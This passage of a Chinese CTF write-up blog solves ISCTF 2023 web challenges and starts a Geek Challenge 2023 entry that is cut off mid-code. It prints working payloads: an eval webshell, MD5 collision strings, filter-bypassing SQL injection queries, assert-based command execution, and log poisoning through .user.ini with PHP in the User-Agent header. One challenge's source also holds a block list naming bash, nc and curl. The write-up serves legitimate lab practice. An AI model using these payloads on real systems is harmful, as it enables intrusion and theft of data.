class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag一分为3，散落在各处，分别是：xxxxxxxx、xxxx、xxx。</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">//标准一句话木马~</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>蚁剑连接</p><p>第一段flag在flag.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;FLAG1:ISCTF&#123;6ced&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二段flag在根目录中</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6033</span><span class="hljs-string">-a4ec-</span><br></code></pre></td></tr></table></figure><p>根目录里发现了一个冒红光的文件<br><img src="https://i.imgs.ovh/2023/12/01/wLgCv.png" alt="img"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">\#!/bin/sh<br>sed -i <span class="hljs-string">&quot;s/&#123;&#123;FLAG1&#125;&#125;/<span class="hljs-variable">$&#123;FLAG:0:10&#125;</span>/&quot;</span> /var/www/localhost/htdocs/flag.php<br>echo <span class="hljs-variable">$&#123;FLAG:10:10&#125;</span> &gt; /flag2<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">FLAG3</span>=<span class="hljs-variable">$&#123;FLAG:20&#125;</span><br><span class="hljs-attribute">FLAG3</span>=<span class="hljs-variable">$&#123;FLAG:20&#125;</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">FLAG</span>=<span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-attribute">FLAG</span>=<span class="hljs-string">&quot;flag&quot;</span><br>httpd -D FOREGROUND<br></code></pre></td></tr></table></figure><p>export创建环境变量</p><p>回到页面执行命令</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>=system(<span class="hljs-string">&#x27;printenv&#x27;</span>);<br><span class="hljs-regexp">//</span><span class="hljs-variable constant_">HOSTNAME</span>=d38fc96b0fdf <span class="hljs-variable constant_">SHLVL</span>=<span class="hljs-number">2</span> <span class="hljs-variable constant_">HOME</span>=<span class="hljs-regexp">/root FLAG3=4f5c-bb37-ee81a5ecc139&#125; PATH=/usr</span><span class="hljs-regexp">/local/sbin</span><span class="hljs-symbol">:/usr/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span> <span class="hljs-variable constant_">PWD</span>=<span class="hljs-regexp">/var/www</span><span class="hljs-regexp">/localhost/htdocs</span> <span class="hljs-variable constant_">FLAG</span>=flag<br></code></pre></td></tr></table></figure><h2 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(FILE);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$str</span> = (String)<span class="hljs-variable">$POST</span>[<span class="hljs-string">&#x27;pan_gu&#x27;</span>];<br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;zhurong&#x27;</span>];<br><span class="hljs-variable">$lida1</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;hongmeng&#x27;</span>];<br><span class="hljs-variable">$lida2</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;shennong&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$lida1</span> !== <span class="hljs-variable">$lida2</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$lida1</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$lida2</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5绕过了!&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;你干嘛?哎哟!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再想想!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&#x27;2023ISCTF&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;就差一点点啦!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span>(<span class="hljs-symbol">$lida</span>1 !== <span class="hljs-symbol">$lida</span>2 &amp;&amp; md5(<span class="hljs-symbol">$lida</span>1) === md5(<span class="hljs-symbol">$lida</span>2))&#123;<br></code></pre></td></tr></table></figure><p>md5强碰撞</p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">hongmeng<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>&amp;shennong<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>)</span></span>)&#123;<br></code></pre></td></tr></table></figure><p>preg_match数组绕过即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?z</span>hurong[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="hljs-variable">$str</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再想想!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$str</span>, <span class="hljs-string">&#x27;2023ISCTF&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;就差一点点啦!&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>preg_match用回溯次数限制绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1000000</span>);<br></code></pre></td></tr></table></figure><h2 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h2><p>sql注入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#<br></code></pre></td></tr></table></figure><p><img src="https://i.imgs.ovh/2023/12/06/3QzbT.png" alt="img"></p><p>有错误回显，看到or被过滤（双写绕过）</p><p>空格也被过滤（%09绕过）</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs llvm">爆库<br><span class="hljs-number">1</span>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>database()#<br>//users<br>爆表<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>group_concat(table_name)<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>infoorrmation_schema.tables<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>table_schema<span class="hljs-operator">=</span>database()#<br>//users<br>爆字段<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>group_concat(column_name)<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>infoorrmation_schema.columns<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>table_name<span class="hljs-operator">=</span>&#x27;users&#x27;#<br>//用户$USER<span class="hljs-punctuation">,</span>CURRENT_CONNECTIONS<span class="hljs-punctuation">,</span>TOTAL_CONNECTIONS<span class="hljs-punctuation">,</span>user<span class="hljs-punctuation">,</span>password$登录成功<br>爆值<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>passwoorrd<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>users#<br>//<span class="hljs-number">21232</span>f<span class="hljs-number">297</span>a<span class="hljs-number">57</span>a<span class="hljs-number">5</span>a<span class="hljs-number">743894</span>a<span class="hljs-number">0e4</span>a<span class="hljs-number">801</span>fc<span class="hljs-number">3</span>：admin的md<span class="hljs-number">5</span>加密值<br>&#x27;<span class="hljs-variable">%09</span>ununionion<span class="hljs-variable">%09</span>seselectlect<span class="hljs-variable">%09</span>passwoorrd<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>users<span class="hljs-variable">%09</span>limit<span class="hljs-variable">%092</span><span class="hljs-punctuation">,</span><span class="hljs-number">1</span>#<br>//用户$ISCTF&#123;**<span class="hljs-keyword">c</span>**<span class="hljs-number">51</span>a<span class="hljs-number">3</span>cf<span class="hljs-number">4</span>-adf<span class="hljs-number">5</span><span class="hljs-number">-4</span>cd<span class="hljs-number">5</span><span class="hljs-number">-80</span>f<span class="hljs-number">3</span><span class="hljs-number">-30</span>**<span class="hljs-keyword">c</span>**<span class="hljs-number">36</span>**<span class="hljs-keyword">c</span>**<span class="hljs-number">3262</span>bd&#125;$登录成功<br></code></pre></td></tr></table></figure><h2 id="wafr"><a href="#wafr" class="headerlink" title="wafr"></a>wafr</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Read /flaggggggg.txt</span><br><span class="hljs-comment">*/</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(FILE);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|more|less|head|tail|nl|sed|sort|uniq|rev|awk|od|vi|vim/i&quot;</span>, <span class="hljs-variable">$POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<span class="hljs-comment">//strings</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;想读我文件？大胆。&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\^|||~|\$|\%|jay/i&quot;</span>, <span class="hljs-variable">$POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;无字母数字RCE？大胆！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash|nc|curl|sess|&#123;|:|;/i&quot;</span>, <span class="hljs-variable">$POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;奇技淫巧？大胆！！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/fl|ag|.|x/i&quot;</span>, <span class="hljs-variable">$POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;大胆！！！&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">assert</span>($_POST[‘code’]);<br></code></pre></td></tr></table></figure><p>assert和eval功能相同，但assert不用在函数后面加<code>;</code></p><p>payload：反斜杠绕过</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">code</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>)<br><span class="hljs-comment">//bin dev etc flaggggggg.txt home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><span class="hljs-keyword">code</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;c\at /f*&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h2><p>对上传的文件内容审查严格</p><p>尝试使用日志包含</p><p>上传.user.ini</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">GIF89a<br>auto_prepend_file=<span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>抓包后在ua头后加入一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//不能用&quot;&quot;，会被转码</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>猜flag的位置直接获取<br>.user.ini</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">string_to_int_array</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-keyword">const</span> intArr = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;str.<span class="hljs-property">length</span>;i++)&#123;<br>          <span class="hljs-keyword">const</span> charcode = str.<span class="hljs-title function_">charCodeAt</span>(i);<span class="hljs-comment">/*返回字符串第一个字符的 Unicode 编码，这里直接理解为ascii码值*/</span><br><br>          <span class="hljs-keyword">const</span> partA = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(charcode / <span class="hljs-number">26</span>);<span class="hljs-comment">/*返回小于等于一个给定数字的最大整数，向下取整*/</span><br>          <span class="hljs-keyword">const</span> partB = charcode % <span class="hljs-number">26</span>;<br><br>          intArr.<span class="hljs-title function_">push</span>(partA);<span class="hljs-comment">/*这两行的意思是在数组末尾添加新元素*/</span><br>          intArr.<span class="hljs-title function_">push</span>(partB);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> intArr;<br>      &#125;<br><br>      <span class="hljs-keyword">function</span> <span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-params">int_array</span>)&#123;<br>        <span class="hljs-keyword">let</span> txt = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;int_array.<span class="hljs-property">length</span>;i++)&#123;<br>          txt += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">97</span> + int_array[i]);<span class="hljs-comment">/*返回ASCII码值对应的字符*/</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> txt;<br>      &#125;<br><br><br><span class="hljs-keyword">const</span> hash = <span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-title function_">string_to_int_array</span>(<span class="hljs-title function_">int_array_to_text</span>(<span class="hljs-title function_">string_to_int_array</span>(parameter))));<br><span class="hljs-keyword">if</span>(hash === <span class="hljs-string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>)&#123;<br>            <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;flag.html&#x27;</span>;<br>          &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;fail&#x27;</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>          &#125;<br></code></pre></td></tr></table></figure><p>python解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">text_to_int_array</span>(<span class="hljs-params">txt</span>):<br>    int_arr = []<br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> txt:<br>        char_code = <span class="hljs-built_in">ord</span>(char) - <span class="hljs-number">97</span><br>        int_arr.append(char_code)<br><br>    <span class="hljs-keyword">return</span> int_arr<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">int_array_to_string</span>(<span class="hljs-params">int_array</span>):<br>    result_str = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(int_array),<span class="hljs-number">2</span>):<br>        result_str += <span class="hljs-built_in">chr</span>(int_array[i]*<span class="hljs-number">26</span> + int_array[i+<span class="hljs-number">1</span>])<br><br>    <span class="hljs-keyword">return</span> result_str<br><br><br>encrypted_str = <span class="hljs-string">&quot;dxdydxdudxdtdxeadxekdxea&quot;</span><br>int_arr = int_array_to_string(text_to_int_array(int_array_to_string(text_to_int_array(encrypted_str))))<br><span class="hljs-built_in">print</span>(int_arr)<br></code></pre></td></tr></table></figure><p>伪协议读取</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?mihoyo=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geek Challenge 2023</title>
    <link href="/2023/11/12/%E6%AF%94%E8%B5%9B/Geek-Challenge-2023/"/>
    <url>/2023/11/12/%E6%AF%94%E8%B5%9B/Geek-Challenge-2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Geek-Challenge-2023"><a href="#Geek-Challenge-2023" class="headerlink" title="Geek Challenge 2023"></a>Geek Challenge 2023</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;syc&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>]) &lt; <span class="hljs-number">2023</span> 